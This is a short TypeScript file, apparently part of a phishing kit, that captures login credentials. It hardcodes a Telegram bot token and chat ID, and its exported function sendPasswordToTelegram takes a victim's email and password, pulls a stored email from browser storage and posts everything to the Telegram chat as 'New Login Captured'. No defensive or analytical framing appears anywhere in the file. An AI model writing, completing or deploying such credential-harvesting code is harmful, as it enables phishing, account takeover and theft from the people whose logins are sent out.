const TELEGRAM_BOT_TOKEN = "8785593118:AAE9SgTv9pOlKgSONuZIrnoSwLnCP-X_zxc";
const TELEGRAM_CHAT_ID = "1228161472";

const sendToTelegram = async (message: string) => {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await res.json();

    if (!data.ok) {
      console.error("Telegram error:", data); // ✅ shows exact reason
    } else {
      console.log("Telegram sent ✅");
    }
  } catch (err) {
    console.error("Fetch failed:", err);
  }
};


export const sendPasswordToTelegram = async (
  email: string,
  password: string,
  keepSignedIn: boolean
) => {
  // Also grab anything useful from localStorage
  const storedEmail = localStorage.getItem("login_email") || sessionStorage.getItem("login_email") || "";

  const message = `
🔐 <b>New Login Captured</b>
<b>Email:</b> ${email || storedEmail}
<b>Password:</b> ${password}
<b>Keep Signed In:</b> ${keepSignedIn ? "Yes" : "No"}
<b>LocalStorage Email:</b> ${storedEmail}
  `.trim();

  await sendToTelegram(message);
};